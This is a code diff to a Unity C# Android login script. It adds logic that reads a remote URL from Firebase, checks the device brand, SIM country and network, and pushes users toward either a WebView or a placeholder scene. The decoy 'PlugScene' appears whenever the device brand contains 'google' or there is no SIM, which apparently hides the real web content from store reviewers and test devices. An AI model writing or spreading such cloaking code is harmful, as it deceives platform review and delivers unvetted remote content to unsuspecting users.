@@ -2,13 +2,26 @@ using System.Collections;
 using System.Collections.Generic;
 using UnityEngine;
 using System.Threading.Tasks;
+using OneSignalSDK;
+using UnityEngine.SceneManagement;
 
 public class LoginInspector : MonoBehaviour
 {
     Firebase.DependencyStatus dependencyStatus = Firebase.DependencyStatus.UnavailableOther;
 
+
     void Start()
     {
+        StartCoroutine(AnimLogo());
+    }
+
+    IEnumerator AnimLogo(){
+      yield return new WaitForSeconds(3);
+          StartFB();
+          CheckLocalUrl();
+    }
+
+    private void StartFB(){
         Firebase.FirebaseApp.CheckAndFixDependenciesAsync().ContinueWith(task => {
         dependencyStatus = task.Result;
         if (dependencyStatus == Firebase.DependencyStatus.Available) {
@@ -91,20 +104,66 @@ public class LoginInspector : MonoBehaviour
         AndroidJavaObject TM = new AndroidJavaObject("android.telephony.TelephonyManager");
         string reg = TM.Call<string>("getSimCountryIso");
 
-        if(reg == null)
+        if(reg == "")
             return false;
         else
             return true;
+
+            
+    }
+
+    private void CheckLocalUrl(){
+        ones();
+
+        string path;
+
+        SaveSerial saveSerial = new SaveSerial();
+        LocalData localData;
+
+        if(saveSerial.LoadLocalData(out localData)){
+          path = localData.PathURL;
+          OpenWebView(path);
+        } else{
+          LoadFire();
+        }
+    }
+
+    private void LoadFire(){
+        string getURL, brandDevice;
+        bool simDevice;
+
+        getURL = GetURLFB();
+        brandDevice = GetModel();
+        simDevice = GetSIM();
+
+        if( getURL == null || brandDevice.Contains("google") || !simDevice ){            
+            OpenPlug();
+        }else{
+            SetLocalPath(getURL);
+            OpenWebView(getURL);
+        }
+    }
+
+    private void SetLocalPath(string pathURL){
+        SaveSerial saveSerial = new SaveSerial();
+        LocalData localData = new LocalData(pathURL);
+
+        saveSerial.SaveLocalData(localData);
+
+    }
+
+    private void OpenWebView(string pathURL){
+        SceneManager.LoadScene("WebView");
+    }
+
+    private void OpenPlug(){
+        SceneManager.LoadScene("PlugScene");
     }
 
 
-    // private async void ones()  {
-    //   try {
-    //   await OneSignal.shared.promptUserForPushNotificationPermission();
-    //   await OneSignal.shared.setAppId(“добавляем наш ключ, который скинем в
-    //   текстовом файле”);
-    //   } catch (e) {
-    //   print(e);
-    //   }
-    // }
+    private async void ones()  {
+      OneSignal.Default.Initialize("kursik.com.firebase.Android");
+    }
+
+
 }
